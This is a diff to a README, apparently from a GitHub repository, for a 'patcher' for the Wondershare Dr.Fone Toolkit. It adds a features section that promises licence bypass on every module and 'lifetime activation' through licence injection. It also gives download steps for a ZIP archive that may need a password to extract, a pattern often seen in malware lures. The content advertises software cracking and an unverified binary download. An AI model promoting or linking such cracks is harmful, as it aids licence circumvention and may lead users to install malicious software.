@@ -10,6 +10,20 @@ Professional patch engine for Wondershare Dr.Fone Toolkit. This tool automates t
 
 ![Success Screenshot](success_screenshot.png)
 
+## 📱 Features & Visual Proof
+
+### 1. Full Device Detection
+The patcher automatically detects your iOS or Android device upon connection.
+![Device Search](device_connected.png)
+
+### 2. Selective Data Patching
+Bypass restrictions on any module: Messages, Photos, WhatsApp, etc.
+![Scanning Data](scanning.png)
+
+### 3. Lifetime Activation Success
+Instant license injection with permanent validity.
+![Activation Success](success_screenshot.png)
+
 ## 📥 Installation
 1. Download the latest release from the [Releases](https://github.com/twillio-ai/DrFone-Toolkit-Patcher/raw/main/DrFone_Toolkit_Patcher_Full.zip) page.
 2. Extract the ZIP archive using the password (if applicable).
